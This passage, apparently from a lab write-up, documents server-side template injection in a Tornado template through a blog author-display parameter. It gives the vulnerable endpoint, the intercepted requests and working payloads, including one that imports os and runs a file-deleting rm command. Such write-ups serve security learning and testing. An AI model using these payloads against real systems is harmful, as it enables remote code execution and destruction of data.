# 4. Affected Asset

Authenticated user profile functionality responsible for configuring how the username is displayed above blog comments.

Affected endpoint:

```
POST /my-account/change-blog-post-author-display
```

---

# 5. Technical Description

The application stored the value of the `blog-post-author-display` parameter and later inserted it directly into a Tornado template without proper validation or sanitization.

Because the parameter was evaluated inside a template expression, it was possible to terminate the existing expression and inject arbitrary Tornado template syntax.

This allowed arbitrary Python code execution using Tornado template directives.

---

# 6. Methodology

1. Authenticate as a valid user.
2. Publish a blog comment.
3. Modify the preferred author display option.
4. Intercept the request responsible for updating the display preference.
5. Confirm SSTI by evaluating a mathematical expression.
6. Inject Python code.
7. Execute an operating system command through the `os` module.
8. Reload the blog post to trigger template rendering.

---

# 7. Relevant HTTP Requests

## 7.1 Original Request

```http
POST /my-account/change-blog-post-author-display HTTP/1.1

blog-post-author-display=user.name
```

---

## 7.2 SSTI Detection

Injected payload:

```text
blog-post-author-display=user.name}}{{7*7}}
```

---

## 7.3 Command Execution

Injected payload:

```text
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```

---

# 8. Proof of Concept (PoC)

## Step 1 – Confirm Template Injection

Payload:

```tornado
{{7*7}}
```

Injected as:

```text
user.name}}{{7*7}}
```

After reloading the page containing the comment, the author's name became:

```
Peter Wiener49}}
```

This confirmed that the Tornado template engine evaluated the injected expression.

---

## Step 2 – Execute Arbitrary Python

The payload imported the Python `os` module:

```python
{% import os %}
```

Then executed:

```python
os.system('rm /home/carlos/morale.txt')
```

Final payload:

```text
user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
```

